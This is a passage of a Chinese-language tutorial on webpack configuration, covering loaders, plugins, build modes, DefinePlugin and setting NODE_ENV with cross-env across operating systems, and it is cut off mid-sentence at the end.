[{"content":"前端工程化 webpack 使用、原理和优化\nWebpack webpack 是一个 JS 应用程序的静态文件打包工具。\n在 webpack 中会将各种类型的文件都看作一个模块，且模块之间可能相互依赖。webpack 打包所有的这些资源文件并编译为一些前端环境(浏览器环境)能识别的一些文件（静态资源），比如 js，css，png 等。\n1 2 npm init -y npm install webpack webpack-cli --save-dev webpack：核心包 webpack-cli：命令行工具，主要是在执行 webpack 命令时，解析命令行中设置的一系列参数（一组命令和选项），加载 webpack 配置文件（默认 webpack.config.js），调用 webpack 核心包中的方法进行构建打包。通过 webpack-cli，可以在命令行中指定 Webpack 的配置文件、执行不同的构建模式（如开发模式或生产模式）、观察文件变化并自动重新构建等。 在命令行中输入 webpack 并附带一些选项时，Webpack CLI 会执行以下步骤来处理命令：\n解析命令行参数：Webpack CLI 会解析命令行中输入的选项和参数，并根据它们的值进行配置。 加载配置文件：Webpack CLI 会尝试加载默认的配置文件 webpack.config.js，如果存在的话。如果命令行中使用了 --config 选项指定了其他配置文件，Webpack CLI 会加载该文件。 合并配置：Webpack CLI 会将命令行选项和配置文件中的配置合并，以形成最终的 Webpack 配置对象。 创建 Webpack 编译器类对象：Webpack CLI 使用合并后的配置创建一个 Webpack 编译器类的实例对象，该编译器对象将负责处理打包过程。 执行 Webpack 编译器：Webpack 编译器开始执行打包过程。它会根据配置中的入口文件和依赖关系，递归地解析和处理各个模块，并将它们打包成最终的输出文件。 输出打包结果：一旦 Webpack 编译器完成打包过程，它会将生成的输出文件写入指定的输出目录。 在执行过程中，Webpack CLI 还可以根据命令行选项和配置文件中的其他配置，执行一些额外的操作，例如启动开发服务器、监听文件变化并自动重新打包等。\n浏览器使用 ES module 1 2 \u0026lt;script src=\u0026#34;./src/index.js\u0026#34; type=\u0026#34;module\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; // 必须指明type为module ES6 模块化语法：\n1 2 3 4 5 // index.js: import { sum, mul } from \u0026#34;./js/math.js\u0026#34;; console.log(sum(20, 30)); console.log(mul(20, 30)); 1 2 3 4 5 6 7 8 math.js: export const sum =(num1,num2)=\u0026gt;{ return num1 + num2 } export const mul =(num1,num2)=\u0026gt;{ return num1 * num2 } ES6 的模块化规范在浏览器中是需要发起网络请求：\n在上面，直接使用 file 协议打开本地的 index.html 文件，产生跨域请求，同时网络面板中也有针对 index.js 的网络请求。说明 ES6 的 import 语法是需要发起网络请求的。\nentry 入口(entry point)告诉 webpack 使用哪个模块或者哪几个模块，作为构建其内部依赖图(dependency graph) 的开始。进入入口后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的\n默认值是 ./src/index.js，但可以通过在 webpack configuration 中配置 entry 属性，来指定一个（或多个）不同 src 入口起点\nentry 中配置的相对路径会以脚本命令执行时所在的路径（process.cwd()）作为基准路径。\n比如：当前项目根目录为 test，该目录下有 webpack.config.js 文件，其中的 entry 字段值为：\u0026rsquo;./src/index.js\u0026rsquo;，如果跳转到 test 的上级目录下，执行 webpack \u0026ndash;config ./test/webpack.config.js，那么将因为找不到入口文件而报错。\n报错信息如下：\n1 2 3 4 5 6 7 8 9 10 11 PS C:\\Users\\Desktop\\webpack202208\\test\u0026gt; cd .. PS C:\\Users\\Desktop\\webpack202208\u0026gt; npx webpack --config .\\test\\webpack.config.js Active code page: 65001 asset index.html 2.62 KiB [emitted] asset main.js 99 bytes [emitted] (name: main) ERROR in main Module not found: Error: Can\u0026#39;t resolve \u0026#39;./src/index.js\u0026#39; in \u0026#39;C:\\Users\\Desktop\\webpack202208\u0026#39; resolve \u0026#39;./src/index.js\u0026#39; in \u0026#39;C:\\Users\\dukkha\\Desktop\\webpack202208\u0026#39; using description file: C:\\Users\\dukkha\\package.json (relative path: ./Desktop/webpack202208) Field \u0026#39;browser\u0026#39; doesn\u0026#39;t contain a valid alias configuration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 entry: \u0026#39;./src/index.js\u0026#39;; entry:[\u0026#39;url1\u0026#39;,\u0026#39;url2\u0026#39;] // 这两个文件的内容都会打包到一个main.js文件中 // 单入口等价于下面这种写法 entry: { main: \u0026#39;./src.index.js\u0026#39;; } entry:(context, environment) =\u0026gt; { console.log(\u0026#39;Context:\u0026#39;, context); console.log(\u0026#39;Environment:\u0026#39;, environment); // 根据环境变量动态返回入口文件 if (environment.production) { return \u0026#39;./src/index.prod.js\u0026#39;; } else { return \u0026#39;./src/index.dev.js\u0026#39;; } // 也可以返回对象或者数组 }, entry:{ main:{ import \u0026#39;./src/index.js\u0026#39;, dependOn:\u0026#39;xxx\u0026#39;, runtime:\u0026#39;runtime-name\u0026#39;// 单独设置这个入口模块的runtime代码 } } 如果 entry 字段被配置为一个函数，那么 Webpack 会在运行时调用这个函数，并传递一些特定的参数。\n以下是 Webpack 内部对 entry 函数的处理逻辑及其传参的详细解释：\ncontext: Webpack 的上下文路径，通常是配置中的 context 字段值。如果没有显式设置 context，默认是 Webpack 配置文件所在的目录。 environment: 一个对象，包含 Webpack CLI 或构建脚本中传递的 mode 和其他环境变量。 output output 属性告诉 webpack 在哪里输出它所创建的 bundle，以及如何命名这些文件\n主要输出文件的默认值是：./dist/main.js，其他生成文件默认放置在./dist 文件夹中\noutput 中的 path 路径则是一个绝对路径，具体打包后生成的打包文件夹在哪里取决于 path 的值\n如果不配置 output 中的 path 选项，则该项的默认值是：process.cwd()，而不是\u0026rsquo;./dist\u0026rsquo;这种相对路径或者 path.resolve(__dirname, \u0026ldquo;dist\u0026rdquo;)，但默认的配置文件有配置这个属性的值\nloader webpack 只能理解 JavaScript 和 JSON 文件 loader 让 webpack 能够去处理其他类型的文件，并将它们转换为有效模块，以供应用程序使用，以及被添加到 webpack 依赖图中 loader 的几种使用方式：\nimport \u0026lsquo;style-loader!css-loader!../css/creatediv.css\u0026rsquo; （内联式，不推荐，只正对这个一个文件使用指定的 loader）\nCLI 方式（不推荐）\npackage.json:\n1 2 3 { \u0026#34;build\u0026#34;: \u0026#34;webpack --module-bind \u0026#39;css=style-loader!css-loader\u0026#39;\u0026#34; } webpack 配置文件中写 loader\n对应规则的 loader 是从右向左执行的，最右侧的 loader 接收到是对应类型的文件的源码，最左侧的 loader 一定会返回一个 js 模块。\n1 2 3 4 5 6 7 8 9 10 11 module.exports = { module: { rules: [ { test: /\\.css$/, use: [\u0026#34;style-loader\u0026#34;, \u0026#34;css-loader\u0026#34;], }, ], }, context: process.cwd(), // 属性值就是项目打包的上下文（项目打包的相对路径），就是项目的目录路径，该配置项几乎不会去改，用默认值就行 }; 如果有同类型的文件，并且想针对不同情况执行不同的 loader，可以使用 Webpack 的 oneOf 配置。oneOf 是 Webpack 4 及以上版本中的一个功能，用来提高性能，确保每个文件只经过其中一个 loader 处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 module.exports = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, oneOf: [ { resourceQuery: /babel/, // 针对 URL 中包含 ?babel 的资源，使用 babel-loader loader: \u0026#34;babel-loader\u0026#34;, options: { presets: [\u0026#34;@babel/preset-env\u0026#34;] }, }, { loader: \u0026#34;babel-like-loader\u0026#34;, // 其他情况下使用自定义的 babel-like-loader options: {}, }, ], }, ], }, }; oneOf oneOf 是用来优化模块规则匹配的一个关键字。它允许你定义一组规则，但 每个文件只会匹配其中一个规则，而不会继续匹配后续规则。这种机制可以提升构建效率，避免文件被多个规则重复处理。\noneOf 的工作方式 oneOf 是 module.rules 中的一个属性，值是一个规则数组。 Webpack 会按顺序遍历数组中的规则，遇到第一个匹配的规则后就停止继续匹配。 如果没有匹配任何规则，Webpack 会抛出错误，除非提供了默认的处理方式。 以下是一个典型的 Webpack 配置，使用 oneOf 优化规则匹配：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 module.exports = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: \u0026#34;babel-loader\u0026#34;, }, { oneOf: [ { test: /\\.css$/, use: [\u0026#34;style-loader\u0026#34;, \u0026#34;css-loader\u0026#34;], // 处理 CSS 文件 }, { test: /\\.scss$/, use: [\u0026#34;style-loader\u0026#34;, \u0026#34;css-loader\u0026#34;, \u0026#34;sass-loader\u0026#34;], // 处理 SCSS 文件 }, { test: /\\.(png|jpe?g|gif)$/i, type: \u0026#34;asset/resource\u0026#34;, // 处理图片文件 }, ], }, ], }, }; 在这个配置中：\n如果文件是 .css，会应用 css-loader 和 style-loader。 如果文件是 .scss，会应用 sass-loader。 如果文件是图片格式（.png, .jpg, .gif），会使用 asset/resource。 oneOf 确保每个文件 只匹配第一个符合条件的规则，后续规则不再处理该文件。\noneOf 的优点 性能优化： 避免文件被多个规则重复匹配。 Webpack 在找到匹配规则后停止继续匹配，减少不必要的开销。 明确的规则优先级： 通过规则的顺序，控制不同规则的优先级。 更清晰的配置结构： 将相关的规则归纳到一起，配置更具可读性。 oneOf 的注意事项 顺序很重要：\noneOf 中的规则按顺序匹配，先定义的规则优先级高。 如果规则顺序不合理，可能会导致预期外的行为。 默认规则：\n如果没有任何规则匹配，Webpack 会抛出错误。 可以在 oneOf 中添加一个默认规则，例如 file-loader 或 asset/resource，以确保所有文件都有处理方式。 1 2 3 4 5 6 7 oneOf: [ // 前面的规则... { // 默认规则 type: \u0026#34;asset/resource\u0026#34;, }, ]; 与其他配置的兼容性：\noneOf 适用于需要明确优先级的场景，但某些场景（如 include 和 exclude 配置）可能需要额外注意规则的适配性。 plugin 插件可以用于执行范围更广的任务。包括：打包优化，资源管理，注入环境变量\nclean-webpack-plugin\n1 2 3 const { CleanWebpackPlugin } = require(\u0026#34;clean-webpack-plugin\u0026#34;); plugins: [new CleanWebpackPlugin()]; 现在可以在 webpack 的 output 配置项中编写一个字段 clean：boolean 实现 clean-webpack-plugin 插件的能力。\n1 2 3 4 5 6 7 { output: { path: path.resolve(__dirname, \u0026#39;dist\u0026#39;), filename: \u0026#39;main.js\u0026#39;, clean: true, }, } html-webpack-plugin\nhtml-webpack-plugin 插件在调用时如果不传递模板参数，则该包的内部有一个默认的 ejs 模板可供使用\u0026mdash;-default_index.ejs\n1 2 3 4 5 6 7 8 9 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= htmlWebpackPlugin.options.title %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;模板html文件路径path\u0026#34;, filename: \u0026#34;index.html\u0026#34;, //打包后生成的html文件名 minify: { removeAttributeQuotes: true, //移除html文件中的双引号 collapseWhitespace: true, //压缩html代码 removeComments: true, }, hash: true, //在引入打包后的js文件时，给它在script标签中src文件名的后面加上hash值，而不是打包后的js文件有hash值 \u0026lt;script type=text/javascript src=boundle.js?fd7b1ef895541b8c9717\u0026gt;\u0026lt;/script\u0026gt;，解决浏览器缓存的问题，可以不用该方法而给js打包文件加hash值。 //chunks:[] 没有该字段时，默认情况下，在多入口时，生成的多个chunk都会被引入到上面的template字段引入指定的html模板文件的最后面，同时引入的顺序是以entry字段中各个入口模块的循序为准，所以如果模块打包后的结果存在依赖关系的话，必须保证它们的顺序正确。 chunks: [\u0026#34;login\u0026#34;, \u0026#34;index\u0026#34;], //表示只即使有很多打包入口模块，都只在打包后html模板的中引入login和index两个chunk，且顺序以entry时出现的顺序引入。 chunksSortMode: \u0026#34;manual\u0026#34;, //表示采用chunks中的顺序引入而不用entry中的引入顺序 }), ]; 1 2 3 4 5 6 7 8 9 10 11 12 13 // webpack.config.js entry: { index: path.resolve(__dirname, \u0026#39;./src/index.js\u0026#39;), index1: path.resolve(__dirname, \u0026#39;./src/index1.js\u0026#39;), index2: path.resolve(__dirname, \u0026#39;./src/index2.js\u0026#39;) } ... plugins: [ new HtmlWebpackPlugin({ ... chunks: [\u0026#39;index\u0026#39;,\u0026#39;index2\u0026#39;] }) ] chunks 选项的作用主要是针对多入口(entry)文件。当有多个入口文件的时候，对应就会生成多个编译后的 js 文件。那么 chunks 选项就可以决定是否都使用这些生成的 js 文件。chunks 默认会在生成的 html 文件中引用所有的 js 文件，当然也可以指定引入哪些特定的文件。\n执行 webpack 命令之后，会看到生成的 index.html 文件中，只引用了 index.js 和 index2.js\n1 2 \u0026lt;script type=text/javascript src=index.js\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=text/javascript src=index2.js\u0026gt;\u0026lt;/script\u0026gt; chunksSortMode 这个选项决定了 script 标签的引用顺序。默认有四个选项，\u0026rsquo;none\u0026rsquo;, \u0026lsquo;auto\u0026rsquo;, \u0026lsquo;dependency\u0026rsquo;, \u0026lsquo;{function}\u0026rsquo;。\n\u0026lsquo;dependency\u0026rsquo; 按照不同文件的依赖关系来排序。 \u0026lsquo;auto\u0026rsquo; 默认值，插件的内置的排序方式 \u0026rsquo;none\u0026rsquo; 无序 {function} 提供一个函数 copy-webpack-plugin\n用于将文件或文件夹从源目录复制到构建目录。它可以用于复制任何类型的文件，包括 JavaScript 文件。copy-webpack-plugin 本身并不会自动将复制的 JavaScript 文件插入到打包后的 HTML 文件中。它的主要功能是复制文件，而不涉及 HTML 文件的修改或处理。所以在源码中使用时，一定要注意源码中引用的相对路径和打包后文件间的相对路径必须统一，不然无法找到对应的资源文件。\n注意，该插件只是将指定目录下的文件拷贝一份到打包输出的文件夹中，但是并不将拷贝后的文件自动引入到打包生成的 html 中。\n文档\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const CopyWebpackPlugin = require(\u0026#39;copy-webpack-plugin\u0026#39;) plugins:[ new CopyWebpackPlugin({ patterns:[ { from:\u0026#39;src/public\u0026#39;, to: \u0026#39;public\u0026#39; // 将src/public目录下的文件复制到构建目录的public目录下 globOptions:{ ignore:[ \u0026#34;**/index.html\u0026#34;, // 排除public下的index.html \u0026#34;**/.DS_Store\u0026#34;, ... ] } } ] }) ] 下图是源码中，直接以相对路径引用图片资源的情况：\n下图是打包后生成文件的相对路径的情况：\n可以看出他们必须保持一致才可以正常工作。\n如果将插件的配置改为下面这样：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const CopyWebpackPlugin = require(\u0026#39;copy-webpack-plugin\u0026#39;) plugins:[ new CopyWebpackPlugin({ patterns:[ { from:\u0026#39;src/public\u0026#39;, // to: \u0026#39;public\u0026#39; 取消行代码 globOptions:{ ignore:[ \u0026#34;**/index.html\u0026#34;, // 排除public下的index.html \u0026#34;**/.DS_Store\u0026#34;, ... ] } } ] }) ] 打包结果如下：\n相对位置发生改变，则使用打包后的文件发布上线的话，则找不到对应的图片资源。\n模式(mode) 开发构建结果用于本地开发调试，不进行代码压缩，打印 debug 信息，需要 sourcemap 文件，热更新\n生产构建生成打包文件直接应用于线上的，即代码都是压缩后，运行时不打印 debug 信息，不包括 sourcemap，可能需要分离 CSS 成单独的文件，以便多个页面共享同一个 CSS 文件\nwebpack 4.x 引入的 mode\n当指定使用 production mode 时，默认会启用各种性能优化的功能，包括构建结果优化以及 webpack 运行性能优化\n如果是 development mode 的话，则会开启 debug 工具，运行时打印详细的错误信息，以及更加快速的增量编译构建\n选项 描述 development 会将 process.env.NODE_ENV 的值设为 development。启用 NamedChunksPlugin 和 NamedModulesPlugin production 会将 process.env.NODE_ENV 的值设为 production。启用 FlagDependencyUsagePlugin, FlagIncludedChunksPlugin, ModuleConcatenationPlugin, NoEmitOnErrorsPlugin, OccurrenceOrderPlugin, SideEffectsFlagPlugin 和 UglifyJsPlugin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 module.export = { mode: \u0026#34;development\u0026#34;, // 等于开启下面的这些配置 devtool: \u0026#34;eval\u0026#34;, cache: true, performace: { hints: false, }, output: { pathinfo: true, }, optimization: { moduleIds: \u0026#34;named\u0026#34;, chunkIds: \u0026#34;named\u0026#34;, mangleExports: false, nodeEnv: \u0026#34;development\u0026#34;, flagIncludedOrder: false, concatenateModules: false, splitChunks: { hidePathInfo: false, minSize: 10000, maxAsyncRequests: Infinity, maxInitialRequests: Infinity, }, emitOnErrors: true, checkWasmTypes: false, removeAvailableModules: false, plugins: [ new webpack.DefinePlugin({ \u0026#34;process.env.NODE_ENV\u0026#34;: JSON.stringify(\u0026#34;development\u0026#34;), }), ], }, }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 module.export = { mode: \u0026#34;production\u0026#34;, // 等于开启下面的这些配置 devtool: false, cache: false, performace: { hints: \u0026#34;warning\u0026#34;, }, output: { pathinfo: false, }, optimization: { moduleIds: \u0026#34;deterministic\u0026#34;, chunkIds: \u0026#34;deterministic\u0026#34;, mangleExports: \u0026#34;deterministic\u0026#34;, nodeEnv: \u0026#34;production\u0026#34;, flagIncludedOrder: true, concatenateModules: false, splitChunks: { hidePathInfo: false, minSize: 10000, maxAsyncRequests: Infinity, maxInitialRequests: Infinity, }, emitOnErrors: true, checkWasmTypes: false, removeAvailableModules: false, plugins: [ new webpack.DefinePlugin({ \u0026#34;process.env.NODE_ENV\u0026#34;: JSON.stringify(\u0026#34;production\u0026#34;), }), new TerserPlugin(/*...*/), // ... ], }, }; 区分环境 读取变量的两个地方：\nwebpack 配置文件被读取时所在的 node 环境，该环境的全局对象上有 process 进程对象\n项目的源码文件实际运行所在的浏览器环境中，浏览器全局对象上没有 process 进程对象，访问则报错\n--mode用来间接设置模块内（源代码中）的process.env.NODE_ENV 可以在模块内(项目源文件代码中，不包括 webpack 配置文件)通过process.env.NODE_ENV获取该process.env.NODE_ENV对应的字符串值（development 或者 production）并进行替换，这是在编译阶段做的替换工作，它和 webpack 配置文件中通过进程对象（process）中的环境变量对象(env) 上的 NODE_ENV 是两个完全不同的概念 1 2 3 \u0026#34;script\u0026#34;:{ \u0026#34;build\u0026#34;:\u0026#34;webpack --mode=development\u0026#34; } 具体过程：webpack --mode=development =\u0026gt; 设置 webpack.config.js 文件中 mode 的值为 development =\u0026gt; mode 为开发模式（development ）下时，webpack 内部通过 webpack.definePlugin 插件设置字符串 process.env.NODE_ENV 在项目源码中的代表的实际值为 development， 在编译阶段，当解析到项目源码中有用到变量：process.env.NODE_ENV 时，直接将它替换为字符串（development），process.env.NODE_ENV 字符串除外。 webpack \u0026ndash;mode=production 也是一样的原理。\n其中通过命令行的\u0026ndash;mode 和配置文件中的 mode 取指定环境，都是一个原理，如果两者同时存在，则命令行\u0026ndash;mode 的优先级更高。\n--env用来设置 webpack 配置文件的函数参数 无法在模块内通过process.env.NODE_ENV访问 可以在 webpack 配置文件中通过配置文件导出的函数获取当前环境变量 1 2 3 \u0026#34;script\u0026#34;:{ \u0026#34;build\u0026#34;:\u0026#34;webpack --env=development\u0026#34; } webpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 const path = require(\u0026#39;path\u0026#39;); const webpack = require(\u0026#39;webpack\u0026#39;); const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;); console.log(process.env.NODE_ENV) // 值为undefined module.exports = function (env, argv) { console.log(env) // development:true console.log(argv) return { mode: \u0026#39;production\u0026#39;, entry:\u0026#39;./src/index.js\u0026#39; output: { path: path.resolve(__dirname, \u0026#39;./dist\u0026#39;), filename: \u0026#39;[name].js\u0026#39; }, module: { rules: [ { test: /\\.css$/, use: [\u0026#39;style-loader\u0026#39;, \u0026#39;css-loader\u0026#39;] } ] }, plugins: [ new HtmlWebpackPlugin({ template: \u0026#39;./public/index.html\u0026#39;, filename: \u0026#39;index.html\u0026#39; }), new webpack.DefinePlugin({ FIRTS_VAR: \u0026#34;\u0026#39;wuyibo\u0026#39;\u0026#34; }) ] }; }; --env 用来设置传给 webpack 配置文件导出的函数的参数，并不直接在项目的模块文件中生效。\n在 script 脚本中使用 \u0026ndash;env=development 的效果是为 webpack 配置文件默认导出的是函数时，可以在函数的参数中获取到该命令行中设置的参数。例如 script 脚本中：\u0026quot;build\u0026quot;: \u0026quot;webpack --env=development\u0026quot; 那么下面代码中的 env 就是：{ WEBPACK_BUNDLE: true, WEBPACK_BUILD: true, development: true }。argv 的结构则是：{ env: { WEBPACK_BUNDLE: true, WEBPACK_BUILD: true, development: true } }，但是因为 mode 默认没有设置时使用的是 production 模式，所以打包出来的源代码中的 process.env.NODE_ENV 变量的取值仍旧是 production 字符串。\ncross-env用来设置 node 环境的process.env.NODE_ENV 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;cross-env NODE_ENV=development webpack\u0026#34; } \u0026ndash;env=development 只是在执行脚本时，给函数类型的 webpack 配置传入参数。如果在 webpack 配置文件中访问 process.env.NODE_ENV 的话，是没有值的，为 undefined。如果想修改 webpack 配置文件中访问的变量的值，可以在命令行中设置 webpack 配置文件运行的环境的环境变量。\n1 2 3 4 5 6 7 \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;set NODE_ENV=development webpack\u0026#34;, // windows下的写法。webpack 配置文件中访问 process.env.NODE_ENV ，则它的值就为development \u0026#34;build\u0026#34;: \u0026#34;cross-env NODE_ENV=development webpack\u0026#34; // 解决操作系统层面的命令兼容性包 }, webpack 配置文件中读取的是 node 配置的环境变量，可以通过 cross-env key=value 来设置。 然后在 webpack 配置文件中可以访问到设置的环境变量，然后再用这个环境变量作为 webpack.DefinePlugin 插件配置项中的值，从而来改变项目模块内的变量的值或者打包方式。\ncross-env 设置的环境变量在项目的模块文件中是无法访问到的。\n例子：\n1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;cross-env NODE_ENV=production FIRST_ENV=one webpack\u0026#34; } 在 webpack 配置文件中可以访问到：\n1 2 console.log(process.env.NODE_ENV); // production console.log(process.env.FIRST_ENV); // one 在项目中的文件 index.js：\n1 2 console.log(process.env.NODE_ENV); // production,是由mode为production模式下的DefinePlugin插件设置的 console.log(process.env.FIRST_ENV); // process.env.FIRST_ENV则直接在打包后文件中存在，运行时报错 vue，react 脚手架项目中可以通过.env 格式的文件向 node 环境中设置变量。借助的是一个第三方库：dotenv-expand。\nDefinePlugin用来设置模块内(源码中)的全局变量 设置所有模块都能读取到的值 可以在任意模块内通过 process.env.xxx或者其他任意字段表示自己设置好的值 无法在node环境(webpack 配置文件中)下获取当前的变量 注意在值为字符串是需要用引号包裹代引号的字符串 1 2 3 4 5 6 plugins:[ new webpack.DefinePlugin({ \u0026#39;process.env.NODE_ENV\u0026#39;:JSON.stringify(process.env.NODE_ENV)， \u0026#39;back_end_url\u0026#39;:\u0026#39;\u0026#34;http://xxxx.xxx/xxx\u0026#34;\u0026#39; }) ] 通过插件 DefinePlugin 设置的 key 可以直接在整个项目的源码中直访问。比如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const webpack = require(\u0026#34;webpack\u0026#34;); const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); module.exports = function (env, argv) { return { mode: \u0026#34;production\u0026#34;, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./public/index.html\u0026#34;, filename: \u0026#34;index.html\u0026#34;, }), new webpack.DefinePlugin({ FIRTS_VAR: \u0026#34;\u0026#39;wuyibo\u0026#39;\u0026#34;, }), ], }; }; 源码 index.js 中：\n1 console.log(FIRTS_VAR); // 在打包编译后的文件中直接就用 wuyibo 字符串进行的替换 在 vue 项目中的 index.html 文件中有: \u0026lt;% BASE_URL %\u0026gt; favicon.ico ,其中 BASE_URL 是要取全局下的该变量对应的值。\n1 2 3 4 5 6 7 const { DefinePlugin } = require(\u0026#34;webpack\u0026#34;); plugins: [ new DefinePlugin({ BASE_URL: \u0026#34;\u0026#39;./\u0026#39;\u0026#34;, }), ]; webpack 的配置文件的模块导出可以是一个函数，也可以是一个配置对象。其中函数可以接受命令行传递的参数。\nWindows CMD 1 2 3 4 5 6 7 8 9 10 11 # 查看所有环境变量 set # 查看单个环境变量（以 NODE_ENV 为例） set NODE_ENV # 设置单个环境变量（以 NODE_ENV 为例） set NODE_ENV=production # 删除单个环境变量（以 NODE_ENV 为例） set NODE_ENV= 如果 NODE_ENV 没有设置，则通过 set NODE_ENV 命令查看时，会提示 环境变量 NODE_ENV 没有定义。\n当设置完 NODE_ENV（假设设置值为 production），再通过 set NODE_ENV 命令查看时，会返回 NODE_ENV=production。\nPowershell 1 2 3 4 5 6 7 8 9 10 11 # 查看所有环境变量 ls env: # 查看单个环境变量（以 NODE_ENV 为例） $env:NODE_ENV # 设置单个环境变量（以 NODE_ENV 为例） $env:NODE_ENV=\u0026#34;production\u0026#34; # 删除单个环境变量（以 NODE_ENV 为例） del env:NODE_ENV 在 Powershell 命令面板的操作中，若 NODE_ENV 没有设置，则通过 set NODE_ENV 命令查看它时，没有任何提示。\n当设置完 NODE_ENV（假设设置值为 production），再通过 set NODE_ENV 命令查看它时，会返回 production。\n注意点\n上面的环境设置只是临时的，即只针对当前运行窗口的环境有效。当 CLI 运行窗口关闭以后，相关设置都会丢失。\n另外，虽然通过 CMD 和 Powershell 都能修改环境变量，但它们之间设置的环境变量并不会相互影响，即你在 CMD 可以设置 NODE_ENV 为 production，同时也可以在 Powershell 中设置 NODE_ENV 为 development，这也印证了上面的描述，设置只针对当前运行窗口有效 。\n如果希望设置一直生效（即 本地设置），可通过 控制面板 -\u0026gt; 系统和安全 -\u0026gt; 系统 -\u0026gt; 高级系统设置 -\u0026gt; 高级 -\u0026gt; 环境变量 这样进行设置（Windows10、可能需要重启）。\nMac 因为只集成一种命令行终端，它设置 Nodejs 环境变量的语法如下：\n1 2 3 4 5 6 7 8 9 10 11 # 查看所有环境变量 env # 查看单个环境变量（以 NODE_ENV 为例） echo $NODE_ENV # 设置单个环境变量（以 NODE_ENV 为例） export NODE_ENV=production # 删除单个环境变量（以 NODE_ENV 为例） unset NODE_ENV 在配置完 Nodejs 环境变量后，你就可以继续运行项目中的打包命令了。\nLunix 1 2 3 4 5 6 7 8 9 10 11 # 查看所有环境变量 env # 查看单个环境变量（以 NODE_ENV 为例） echo $NODE_ENV # 设置单个环境变量（以 NODE_ENV 为例） export NODE_ENV=production # 删除单个环境变量（以 NODE_ENV 为例） unset NODE_ENV 在命令行操作中，若 NODE_ENV 没有设置，则通过 echo $NODE_ENV 命令查看它时，没有任何提示。\n当设置完 NODE_ENV（假设设置值为 production），再通过 set NODE_ENV 命令查看它时，会返回 production。\n但是，采用 命令行（CLI）设置 的方式来修改 Nodejs 环境变量有一个不好地方。即每次在运行打包命令前，都要先通过 set NODE_ENV=xx 或者 export NODE_ENV=xx 等类似的命令来设置或者切换环境变量（这里指的是重开了命令窗口，或者切换打包环境的情况下）。\n第二种做法，即配置 package.json。\n配置 package.json 在项目配置文件 package.json 中，根据不同的打包命令去设置相应的 Nodejs 环境变量，是一种非常主流的做法。其实本质上来说，只是将在命令行面板设置环境变量的命令语句放到了 package.json 文件中，把 设置环境变量 和 打包 两个命令合并运行而已。\n这种方式，就是将 NODE_ENV 注入到 process.env 对象。不同环境下，设置如下：\nWindows 系统 在这种方式下，无论你是使用 CMD (命令提示符) 还是 Powershell 命令行工具，你都可以在 package.json 这样配置：\n1 2 3 4 5 6 7 8 9 // package.json { ... \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;set NODE_ENV=production\u0026amp;\u0026amp; npm run clean \u0026amp;\u0026amp; webpack\u0026#34;, \u0026#34;clean\u0026#34;: \u0026#34;rimraf ./build \u0026amp;\u0026amp; mkdirp build\u0026#34;, } } 配置完后（mkdirp 是一个生成文件夹的第三方包），你只需要在命令行面板运行 npm run build 即可完成打包。\n注意点\n在 Windows 系统中，你必须移除环境变量命令与 \u0026amp;\u0026amp; 符号之间的空白。否者，配置的命令不能生效！\nMac 系统 1 2 3 4 5 6 7 8 9 // package.json { ... \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;export NODE_ENV=production \u0026amp;\u0026amp; npm run clean \u0026amp;\u0026amp; webpack\u0026#34;, \u0026#34;clean\u0026#34;: \u0026#34;rimraf ./build \u0026amp;\u0026amp; mkdirp build\u0026#34;, } } 从上面描述可以看到，不论是不同的操作系统，还是不同的命令行终端，虽然目的都是设置 Nodejs 环境变量，但它们的语法都不尽相同。这就带来两个问题：\n在 Windows 开发部署的项目，可能在 Mac 系统无法正常打包 在跨平台开发的项目上，你还得记住每个命令行终端所使用的语法，也麻烦 为了解决这一问题，有人开发了 cross-env。\n跨平台 - cross-env cross-env 是一个跨平台设置环境变量的第三方包，它可以让你只配置一行命令，就能轻松地在多个平台设置环境变量。\n首先，安装它（由于多个项目在用，所以就全局安装了）：\n1 npm install -g cross-env 然后，在 package.json 文件中进行设置：\n1 2 3 4 5 6 7 8 9 // package.json { ... \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;npm run clean \u0026amp;\u0026amp; cross-env NODE_ENV=production webpack\u0026#34;, \u0026#34;clean\u0026#34;: \u0026#34;rimraf ./build \u0026amp;\u0026amp; mkdirp build\u0026#34;, } } 这样，不管电脑是 Windows 系统还是 Mac 系统 ，不管用的 